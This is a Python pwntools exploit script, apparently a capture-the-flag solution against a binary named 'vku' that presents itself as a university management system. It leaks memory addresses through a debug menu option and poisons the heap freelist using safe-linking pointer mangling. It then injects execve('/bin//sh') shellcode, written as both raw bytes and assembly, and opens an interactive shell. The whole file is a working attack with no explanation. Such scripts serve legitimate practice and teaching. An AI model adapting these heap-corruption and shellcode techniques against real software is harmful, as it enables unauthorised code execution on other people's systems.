#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('vku', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*main+44
        b*main+349 # add student
        b*main+370
        b*_ZN7StudentC2ENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEi+78 # strcp
        c   
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

# LD_PRELOAD="./libc.so.6 ./libm.so.6 ./libstdc++.so.6" ./vku_patched
# patchelf --force-rpath --set-rpath . ./vku_patched

# sla("(max 100 chars):", b"lmaodarkenv")

sla(b'our choice : ', b'1337')

p.recvuntil(b'Binary Base : ')
exe.address = int(p.recvline()[:-1], 16)

p.recvuntil(b'Heap Base   : ')
heap_base = int(p.recvline()[:-1], 16)

p.recvuntil(b'Stack Base  : ')
stack_base = int(p.recvline()[:-1], 16)

info(f"Binary base: {hex(exe.address)}")
info(f"Heap base: {hex(heap_base)}")
info(f"Stack base: {hex(stack_base)}")

read_leak = heap_base +0x12318

sla(b'Address to read (hex): ', hex(read_leak).encode())

slna(b'Length (hex): ', 8)

pad = p.recvline()

leak = int(p.recvline()[:-1].replace(b' ', b''), 16)
libc_leak = u64(p64( leak, endian='big'), endian='little')
libc.address = libc_leak - 0x2044e0

info(f"libc leak: {hex(libc_leak)}")
info(f"libc base: {hex(libc.address)}")

# slna(b'Your choice : ', 1)
# sla(b'Your name: ', b'C'*50)

def add_lecture(name, age):
    p.recvuntil(" Welcome to VKU University Management System")
    sla(":", "1")
    sla("Name :", name)
    slna("Age :", age)

def add_student(name, age):
    p.recvuntil(" Welcome to VKU University Management System")
    sla(":", "2")
    sla("Name :", name)
    slna("Age :", age) 

def show(idx):
    p.recvuntil(" Welcome to VKU University Management System")
    sla(":", "4")
    slna("Index:", idx)

def delete(idx):
    p.recvuntil(" Welcome to VKU University Management System")
    sla(":", "5")
    slna("dex:", idx)




slna(":", 4)

firsttime = b"lmaodark" +  p64(stack_base + 0xc) * 2  
# firsttime += 
sa("please enter your name:", firsttime)

slna(":", 4)

add_student(b"a", 10) # 4
add_student(b"b", 20) # 2
add_student(b"c", 30) # 1
add_student(b"d", 40) # 3


delete(3)
delete(1)
delete(1)
delete(0)

fake_ptr = heap_base +0x124c0

def protect(ptr1,ptr2):
    return ptr1^(ptr2>>12)

load = flat(
    b'A'*0x24,
    protect(stack_base, fake_ptr)
)

add_student(load, 40) # 0

for i in range(7):
    fix = flat(
        b'S'*(0x1c + 6 - i),
        0x31
    )
    delete(0)
    add_student(fix, 136)

# load = flat(
#     b'A'*0x24,
#     exe.address + 0x82e8
# )

# add_student(load, 36) # 1

# for i in range(7):
#     fix = flat(
#         b'S'*(0x1c + 6 - i),
#         0x31
#     )
#     delete(1)
#     add_student(fix, 136)
shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

add_student(b'A'*23, 36) # 2
# add_student(b'A'*23, 36) # 2

shell1 = asm(f"""
    xor rsi, rsi            /* rsi = 0 (2nd arg: argv = NULL) */
    xor rdx, rdx            /* rdx = 0 (3rd arg: envp = NULL) */

    push rsi 
    
    mov rdi, 0x68732f2f6e69622f
    push rdi
    
    mov rdi, rsp

    xor rax, rax            /* Ensure upper bytes are 0 */
    mov al, 59              /* Set lower byte to 59 */

    syscall
""")

add_student(shell1, 369)

delete(0)

load = flat(
    b'A'*0x24,
    exe.address + 0x82e8
)
# 0x55555555736a
add_student(load, 369)

show(0)

p.interactive()
